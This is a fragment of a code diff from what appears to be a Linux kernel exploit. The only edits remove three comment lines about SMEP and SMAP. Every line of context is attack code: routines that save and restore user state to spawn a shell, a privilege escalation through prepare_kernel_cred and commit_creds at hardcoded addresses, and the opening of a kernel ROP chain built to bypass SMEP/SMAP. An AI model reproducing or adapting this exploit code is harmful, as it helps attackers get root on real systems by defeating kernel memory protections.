@@ -30,7 +30,6 @@ void save_state(void) {
         : "memory");
 }
 
-// nosmep
 void restore_state(void) {
     asm volatile(
         ".intel_syntax noprefix;"
@@ -46,7 +45,6 @@ void restore_state(void) {
         : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_shell));
 }
 
-// nosmep
 void escalate_privilege(void) {
     char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
     void (*cc)(char *) = (void *)(addr_commit_creds);
@@ -58,7 +56,6 @@ void escalate_privilege(void) {
     restore_state();
 }
 
-// +smep,+smap
 void krop(uint64_t *ptr) {
     *ptr++ = pop_rdi_ret;
     *ptr++ = 0;
